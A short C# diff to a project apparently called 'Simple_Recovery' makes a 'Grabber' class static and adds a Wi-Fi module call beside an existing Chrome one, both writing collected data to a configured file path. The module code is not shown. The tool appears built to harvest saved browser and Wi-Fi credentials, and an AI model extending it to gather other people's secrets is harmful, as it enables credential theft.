@@ -3,7 +3,7 @@ using System.IO;
 
 namespace Simple_Recovery
 {
-    public class Grabber
+    public static class Grabber
     {
         // Initialize the directory if it doesn't exist
 
@@ -20,6 +20,9 @@ namespace Simple_Recovery
             InitializeDirectory();
 
             Modules.Chrome.WriteToFile(ConfigurationManager.AppSettings["path"]);
+            
+            Modules.Wifi.WriteToFile(ConfigurationManager.AppSettings["path"]);
+
         }
     }
 }
